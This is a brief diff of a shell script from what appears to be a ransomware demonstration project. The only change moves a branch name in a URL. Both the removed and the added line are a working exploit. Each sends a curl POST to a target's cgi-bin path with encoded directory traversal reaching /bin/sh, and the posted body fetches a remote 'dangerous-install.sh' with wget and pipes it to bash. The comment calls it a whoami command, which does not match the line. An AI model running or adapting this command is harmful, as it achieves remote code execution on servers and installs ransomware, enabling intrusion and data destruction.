@@ -6,4 +6,4 @@ else
 fi;
 
 # curl target with whoami command
-curl -X POST --data 'echo;wget -q -O - https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/ransomware/scripts/dangerous-install.sh | bash' $TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh 
+curl -X POST --data 'echo;wget -q -O - https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/ransomware/scripts/dangerous-install.sh | bash' $TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh 
